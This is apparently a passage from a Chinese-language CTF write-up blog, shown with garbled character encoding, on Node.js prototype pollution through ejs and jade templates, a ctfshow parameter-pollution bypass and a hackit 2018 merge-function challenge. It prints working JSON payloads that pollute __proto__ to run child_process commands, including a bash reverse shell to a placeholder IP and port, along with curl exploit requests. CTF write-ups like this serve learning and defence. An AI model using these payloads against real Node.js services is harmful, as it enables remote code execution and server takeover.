<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;filename&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/ç›‘å¬ç«¯å£ 0&gt;&amp;1&quot;</span>&#x27;);var __tmp2<span class="hljs-string">&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p>è¿˜æœ‰ä¸€ä¸ªå…¥å£ outputFunctionNameï¼š<a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/ç›‘å¬ç«¯å£ 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ³¨æ„åˆ° login.js çš„<code>this.userinfo = new function()&#123;...</code>æ‰€ä»¥ä¸Šé¢çš„ payload å†åµŒå¥—ä¸€ä¸ª<code>__proto__</code></p>
<h4 id="ctfshow342ã€343"><a href="#ctfshow342ã€343" class="headerlink" title="ctfshow342ã€343"></a>ctfshow342ã€343</h4><ul>
<li>jade</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025#toc-2">https://xz.aliyun.com/t/7025#toc-2</a></p>
<p><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade</a></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172124317.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172422442.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172602483.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124172725768.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124173907879.png" srcset="/img/loading.gif" lazyload></p>
<p>js è°ƒè¯•çœŸçš„ä¸€å¨å¨çš„ Orz</p>
<p>this.engine è·Ÿè¿›</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124174739562.png" srcset="/img/loading.gif" lazyload></p>
<p>ç»§ç»­è·Ÿè¿›</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211124174952093.png" srcset="/img/loading.gif" lazyload></p>
<p>å¯è§è¿”å›å€¼å¤„ï¼š</p>
<blockquote>
<p>return handleTemplateCache(options)(options);</p>
</blockquote>
<p>è·Ÿè¿›ä¸€ä¸‹ handleTemplateCache</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125001447005.png" srcset="/img/loading.gif" lazyload></p>
<p>è·Ÿä¸€ä¸‹ compile<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125001503138.png" srcset="/img/loading.gif" lazyload></p>
<p>å…ˆçœ‹ä¸€ä¸‹ parse</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125003052754.png" srcset="/img/loading.gif" lazyload></p>
<p>parser å†…ï¼Œtokens è¢«å†…éƒ¨ parse åä¼ åˆ° compiler è¢« compileï¼Œèµ‹ä¸º js çš„å€¼ï¼Œjs è¢«éƒ¨åˆ†ä¼ å…¥ body å†…</p>
<p>çœ‹ä¸€ä¸‹ compileï¼Œå®ƒæ˜¯ compiler çš„å‡½æ•°ï¼Œå» node_module æ‰¾</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125003818514.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿”å› buf ä¼ å› compile</p>
<p>è·Ÿè¿› 66 è¡Œ this.visit(this.node);<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125082102153.png" srcset="/img/loading.gif" lazyload></p>
<p>this.debug=true æ—¶ node.filename è¢« stringify è½¬æ¢ä¸ºå­—ç¬¦ä¸² node.line éšç€è¢« push è¿› buf</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125082655288.png" srcset="/img/loading.gif" lazyload></p>
<p>this.visitNode(node);éå† ast æ ‘åå›åˆ° compile<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125084259360.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125084511998.png" srcset="/img/loading.gif" lazyload></p>
<p>node.line è¢«è®°å½•åˆ° fn ä¸­ï¼Œç„¶å</p>
<blockquote>
<p>fn = new Function(â€˜locals, jadeâ€™, fn);</p>
</blockquote>
<p>é‚£ä¹ˆæˆ‘ä»¬çš„æ±¡æŸ“ç‚¹å°±å‡ºæ¥äº†ï¼Œ<strong>æ±¡æŸ“åˆ° node.line å°±å¯ä»¥è¿è¡Œä»£ç äº†</strong></p>
<h5 id="ç¢°åˆ°é—®é¢˜"><a href="#ç¢°åˆ°é—®é¢˜" class="headerlink" title="ç¢°åˆ°é—®é¢˜"></a>ç¢°åˆ°é—®é¢˜</h5><p>post /login</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;line&quot;</span>: <span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç›‘è§† node.line å€¼</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126173326438.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126173359572.png" srcset="/img/loading.gif" lazyload></p>
<p>æˆ–è€…<code>Uncaught ReferenceError: node is not defined</code>ï¼Œè¯´æ˜ node.line å­˜åœ¨åŸå§‹çš„å€¼ï¼Œå®ƒä¸ä¼šå» Object æ‰¾æ±¡æŸ“çš„å€¼</p>
<p>é‡æ–°æ¢³ç†ä¸€ä¸‹è°ƒç”¨æ ˆ</p>
<blockquote>
<p>res.render-&gt;app.render-&gt;tryRender-&gt;view.render-&gt;this.engine</p>
<ol>
<li>app.js :: res.render</li>
<li>jade/lib/index.js :: exports.__express</li>
<li>jade/lib/index.js :: exports.renderFile<ol>
<li>jade/lib/index.js :: handleTemplateCache</li>
</ol>
</li>
<li>jade/lib/index.js :: exports.compile<ol>
<li>jade/lib/index.js :: parse -&gt; compiler.compile();<ol>
<li>jade/lib/compiler.js :: Compiler.compile -&gt; this.visit(this.node)</li>
<li>jade/lib/compiler.js :: this.visit</li>
<li>jade/lib/compiler.js :: this.buf.push</li>
</ol>
</li>
<li>jade/lib/index.js :: parse -&gt; options.self</li>
<li>jade/lib/index.js :: fn = new Function(â€˜locals, jadeâ€™, fn)</li>
<li>jade/lib/index.js :: fn(locals, Object.create(runtime))</li>
</ol>
</li>
</ol>
</blockquote>
<p>è¿›å…¥ app.render åå¯ä»¥çœ‹åˆ°è·å–äº† optionsï¼Œè§¦å‘ app æ¸²æŸ“å¼•æ“è¿›è¡Œæ¸²æŸ“</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125170700643.png" srcset="/img/loading.gif" lazyload></p>
<p>ç³»åˆ—å‚æ•°è®¾ç½®ç»§ç»­æ­¥è¿‡ï¼Œè¿›å…¥ tryRender</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125173138254.png" srcset="/img/loading.gif" lazyload></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå¯»æ‰¾åˆ° app çš„æ¸²æŸ“å¼•æ“ï¼Œå¹¶ä¸”è®¾ç½®ä¸º jadeï¼Œå¼€å§‹æ¸²æŸ“</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125173338485.png" srcset="/img/loading.gif" lazyload></p>
<p>this.engine è¿›å…¥ jade åº“</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211125173430135.png" srcset="/img/loading.gif" lazyload></p>
<p>å›åˆ° node.line æ‰“ä¸€ä¸‹çœ‹çœ‹</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126174150498.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>TypeError: this[(â€œvisitâ€ + node.type)] is not a function</p>
</blockquote>
<p>æ‰¾åˆ° Compiler.visitNodeï¼Œæ‰“ä¸ªæ–­ç‚¹</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126174434191.png" srcset="/img/loading.gif" lazyload></p>
<p>æ‹¼æ¥å‘ç°æ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œéå† ast æ ‘ï¼Œé€šå¸¸æ˜¯é€šè¿‡â€œvisit+èŠ‚ç‚¹ç±»å‹â€æ¥éå†æ‰€æœ‰èŠ‚ç‚¹çš„ï¼Œè§‚å¯Ÿå…‰æ ‡ï¼ŒæŒ‰ç…§ä»–çš„é»˜è®¤å€¼è®¾ç½®ä¸º Block</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126183747677.png" srcset="/img/loading.gif" lazyload></p>
<p>èŠ‚ç‚¹ç±»å‹ä¸åˆè¦æ±‚ï¼Œæµ‹è¯•æ‰€æœ‰èŠ‚ç‚¹ç±»å‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">visitAttributes</span><br>visitEach<br>visitCode âˆš<br>visitBlockCommentâˆš<br>visitCommentâˆš<br>visitText<br>visitFilter<br>visitTag<br>visitMixin<br>visitDoctypeâˆš<br>visitMixinBlockâˆš<br>visitBlock<br>visitLiteral<br>visitWhen<br>visitCase<br>visitNode<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126184235129.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>TypeError: plugin is not a function</p>
</blockquote>
<p>çœ‹æŠ¥é”™è¿˜æ²¡æœ‰å®Œæˆæ¸²æŸ“ï¼Œæ‰¾åˆ° jade æ¸²æŸ“å®Œå‰çš„æœ€åæŠ¥é”™</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126212401866.png" srcset="/img/loading.gif" lazyload></p>
<p>æ˜¯ä¸€ä¸ªåˆ¤æ–­ï¼Œæ‰“è¿›å»çš„æ—¶å€™ self æ˜¯ undefinedï¼Œå¯ä»¥æ±¡æŸ“</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126231450129.png" srcset="/img/loading.gif" lazyload></p>
<p>æ±¡æŸ“ title</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126231900595.png" srcset="/img/loading.gif" lazyload></p>
<p>æ±¡æŸ“ message</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211126232004589.png" srcset="/img/loading.gif" lazyload></p>
<p>æ±¡æŸ“ errorï¼Œä¸€å¼€å§‹ä¼ äº†ä¸€ä¸ª 1ï¼Œä¼  json æ ¼å¼çš„å†…å®¹</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">,<span class="hljs-string">&quot;error&quot;</span>:&#123;<span class="hljs-attr">&quot;status&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">&quot;stack&quot;</span>:<span class="hljs-string">&quot;runing&quot;</span>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>è¡¥å……ï¼Œå…¶å®æ±¡æŸ“ç›®æ ‡å°±æ˜¯ node.lineï¼Œä¸€å¼€å§‹å°±æ±¡æŸ“ node.line å°±å¯ä»¥çŸ¥é“åªæ±¡æŸ“å“ªäº›å±æ€§å³å¯ï¼Œå› ä¸ºæœ‰äº›å±æ€§ä¸é…ç½®çš„è¯ï¼Œå®ƒè¦ä¹ˆæœ‰é»˜è®¤å€¼ï¼Œè¦ä¹ˆå°±æ˜¯èƒ½éƒ¨åˆ†æ¸²æŸ“æ²¡å®Œæˆï¼Œä¸å½±å“æˆ‘ä»¬çš„æ±¡æŸ“æ•°æ®çš„æ‰§è¡Œ</p>
<p>å¯¹äºæ™®é€šæ¨¡æ¿ï¼Œåªéœ€è¦æ±¡æŸ“ self å’Œ lineï¼Œæœ‰ç»§æ‰¿çš„æ¨¡æ¿éœ€è¦æ±¡æŸ“ type</p>
<p>å½“æœ‰é¡¶æ ¼ h=title ç±»å‹çš„éœ€è¦æ±¡æŸ“ block ç±»å‹</p>
<p>jade å…¥å£ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">exports</span>.__express = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">path, options, fn</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (<br>    options.compileDebug == <span class="hljs-literal">undefined</span> &amp;&amp;<br>    process.env.NODE_ENV === <span class="hljs-string">&#x27;production&#x27;</span><br>  ) &#123;<br>    options.compileDebug = <span class="hljs-literal">false</span><br>  &#125;<br>  <span class="hljs-built_in">exports</span>.renderFile(path, options, fn)<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>options.compileDebug</code> æ— åˆå§‹å€¼ï¼Œå¯ä»¥è¦†ç›–å¼€å¯ Debug æ¨¡å¼ï¼Œå½“ç„¶ä¹Ÿæœ‰å¦å¤–ä¸€ç§æƒ…å†µï¼Œéƒ¨ç½²æ—¶ï¼Œæ²¡æœ‰æ­£ç¡®é…ç½® <code>req.app.get(&#39;env&#39;)</code> å¯¼è‡´ debug æ¨¡å¼å¼€å¯ï¼Œé‚£ä¹ˆè¿™ä¸ªå˜é‡ä¹Ÿå¯ä»¥ä¸ç”¨è¦†ç›–ï¼Œä½†ä¸ºäº†ç¡®ä¿é€šç”¨æ€§ï¼Œè¿™é‡Œè¿˜æ˜¯è¦†ç›–ä¸€ä¸‹ï¼Œé˜²æ­¢æ­£ç¡®é…ç½®</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123; <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123; <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123; <span class="hljs-attr">&quot;compileDebug&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">&quot;line&quot;</span>: <span class="hljs-number">1</span> &#125; &#125; &#125;<br></code></pre></td></tr></table></figure>

<p>å¦å¤–<strong>this.debug</strong>å“ªé‡Œæ¥ï¼Ÿï¼Ÿ</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> Compiler = (<span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Compiler</span> (<span class="hljs-params">node, options</span>) </span>&#123;<br>  <span class="hljs-built_in">this</span>.debug = <span class="hljs-literal">false</span> !== options.compileDebug<br>  <span class="hljs-comment">// ...</span><br>&#125;)<br></code></pre></td></tr></table></figure>
</blockquote>
<p>æœ€ç»ˆ Expï¼š</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;line&quot;</span>: <span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>,<br>      <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;Code&quot;</span>,<br>      <span class="hljs-attr">&quot;self&quot;</span>: <span class="hljs-number">1</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ¥ä¸ªå…¨å®¶ç¦</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211127000013927.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="ctfshow-344"><a href="#ctfshow-344" class="headerlink" title="ctfshow 344"></a>ctfshow 344</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js">router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span><br>  <span class="hljs-keyword">if</span> (req.url.match(<span class="hljs-regexp">/8c|2c|\,/gi</span>)) &#123;<br>    res.end(<span class="hljs-string">&#x27;where is flag :)&#x27;</span>)<br>  &#125;<br>  <span class="hljs-keyword">var</span> query = <span class="hljs-built_in">JSON</span>.parse(req.query.query)<br>  <span class="hljs-keyword">if</span> (<br>    query.name === <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp;<br>    query.password === <span class="hljs-string">&#x27;ctfshow&#x27;</span> &amp;&amp;<br>    query.isVIP === <span class="hljs-literal">true</span><br>  ) &#123;<br>    res.end(flag)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.end(<span class="hljs-string">&#x27;where is flag. :)&#x27;</span>)<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure>

<p>ä¸èƒ½æœ‰ 8cã€2cã€é€—å·</p>
<p>æ­£å¸¸è¯·æ±‚ï¼š</p>
<blockquote>
<p>?query={â€œnameâ€:â€adminâ€,â€passwordâ€:â€ctfshowâ€,â€isVIPâ€:true}</p>
</blockquote>
<p>è¿™é‡Œä»‹ç»ä¸€ä¸‹ HPP æ•°æ®æ±¡æŸ“</p>
<blockquote>
<p>Web æœåŠ¡å™¨ ã€€ã€€ã€€ã€€ã€€ã€€ å‚æ•°è·å–å‡½æ•° ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ è·å–åˆ°çš„å‚æ•°</p>
<p>PHP/Apache ã€€ã€€ ã€€ã€€ $_GET(â€œparâ€) ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ Last</p>
<p>JSP/Tomcat ã€€ã€€ã€€ã€€ Request.getParameter(â€œparâ€) First</p>
<p>Perl(CGI)/Apache ã€€ Param(â€œparâ€) ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ First</p>
<p>Python/Apache ã€€ã€€ getvalue(â€œparâ€) ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ All(List)</p>
<p>ASP/IIS ã€€ã€€ã€€ã€€ã€€ã€€ Request.QueryString(â€œparâ€) ã€€ã€€ All (comma-delimited string)</p>
</blockquote>
<p>è€Œ nodejs å°±æ˜¯ä¼šå°†åŒåå‚æ•°ä»¥æ•°ç»„è¿›è¡Œå­˜å‚¨ï¼Œjson.parse ä¹Ÿèƒ½æ­£å¸¸è§£æ</p>
<blockquote>
<p>?query={â€œnameâ€:â€adminâ€&amp;query=â€passwordâ€:â€ctfshowâ€&amp;query=â€isVIPâ€:true}</p>
</blockquote>
<p>é€—å·å·²ç»ç»•è¿‡ï¼Œurl ç¼–ç çœ‹ä¸€ä¸‹</p>
<blockquote>
<p>%3Fquery%3D%7B%22name%22%3A%22admin%22%26query%3D%22password%22%3A%22ctfshow%22%26query%3D%22isVIP%22%3Atrue%7D</p>
</blockquote>
<p>ctfshow å‰é¢å‡ºç°äº†ä¸€ä¸ª%22ï¼Œæ˜¯åŒå¼•å·ï¼Œå’Œ c æˆäº† 2cï¼Œc å¾—ç»•ä¸€ä¸‹ï¼Œè¿›è¡Œ unicode ç¼–ç ä¸€ä¸‹%63</p>
<p>payloadï¼š</p>
<blockquote>
<p>?query={â€œnameâ€:â€adminâ€&amp;query=â€passwordâ€:â€%63tfshowâ€&amp;query=â€isVIPâ€:true}</p>
</blockquote>
<h4 id="hackit-2018"><a href="#hackit-2018" class="headerlink" title="hackit 2018"></a>hackit 2018</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&#x27;use strict&#x27;</span><br><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>)<br><br><span class="hljs-keyword">const</span> isObject = <span class="hljs-function"><span class="hljs-params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="hljs-built_in">Object</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">merge</span> (<span class="hljs-params">a, b</span>) </span>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>    <span class="hljs-keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;<br>      merge(a[attr], b[attr])<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      a[attr] = b[attr]<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> a<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span> (<span class="hljs-params">a</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> merge(&#123;&#125;, a)<br>&#125;<br><br><span class="hljs-comment">// Constants</span><br><span class="hljs-keyword">const</span> PORT = <span class="hljs-number">8080</span><br><span class="hljs-keyword">const</span> HOST = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br><span class="hljs-keyword">const</span> admin = &#123;&#125;<br><br><span class="hljs-comment">// App</span><br><span class="hljs-keyword">const</span> app = express()<br>app.use(bodyParser.json())<br>app.use(cookieParser())<br><br>app.use(<span class="hljs-string">&#x27;/&#x27;</span>, express.static(path.join(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>)))<br>app.post(<span class="hljs-string">&#x27;/signup&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> body = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.body))<br>  <span class="hljs-keyword">var</span> copybody = clone(body)<br>  <span class="hljs-keyword">if</span> (copybody.name) &#123;<br>    res.cookie(<span class="hljs-string">&#x27;name&#x27;</span>, copybody.name).json(&#123;<br>      <span class="hljs-attr">done</span>: <span class="hljs-string">&#x27;cookie set&#x27;</span><br>    &#125;)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.json(&#123;<br>      <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;cookie not set&#x27;</span><br>    &#125;)<br>  &#125;<br>&#125;)<br>app.get(<span class="hljs-string">&#x27;/getFlag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> Ğ°dmin = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.cookies))<br>  <span class="hljs-keyword">if</span> (admin.Ğ°dmin == <span class="hljs-number">1</span>) &#123;<br>    res.send(<span class="hljs-string">&#x27;hackim19&#123;&#125;&#x27;</span>)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.send(<span class="hljs-string">&#x27;You are not authorized&#x27;</span>)<br>  &#125;<br>&#125;)<br>app.listen(PORT, HOST)<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Running on http://<span class="hljs-subst">$&#123;HOST&#125;</span>:<span class="hljs-subst">$&#123;PORT&#125;</span>`</span>)<br></code></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -vv --header &#x27;Content-type: application/json&#x27; -d &#x27;&#123;&quot;__proto__&quot;: &#123;&quot;admin&quot;: 1&#125;&#125;&#x27; &#x27;http://0.0.0.0:4000/signup&#x27;;<br><br>curl -vv &#x27;http://0.0.0.0:4000/getFlag&#x27;<br></code></pre></td></tr></table></figure>

<p>é¦–å…ˆè¯·æ±‚ /signup æ¥å£ï¼Œåœ¨ NodeJS æœåŠ¡ä¸­ï¼Œæˆ‘ä»¬è°ƒç”¨äº†æœ‰æ¼æ´çš„ merge æ–¹æ³•ï¼Œå¹¶é€šè¿‡ __proto__ ä¸º Object.prototypeï¼ˆå› ä¸º {}.__proto__ === Object.prototypeï¼‰ æ·»åŠ ä¸Šä¸€ä¸ªæ–°çš„å±æ€§ adminï¼Œä¸”å€¼ä¸º 1ã€‚</p>
<p>å†æ¬¡è¯·æ±‚ getFlag æ¥å£ï¼Œæ¡ä»¶è¯­å¥ admin.Ğ°dmin == 1 ä¸º trueï¼ŒæœåŠ¡è¢«æ”»å‡»ã€‚</p>
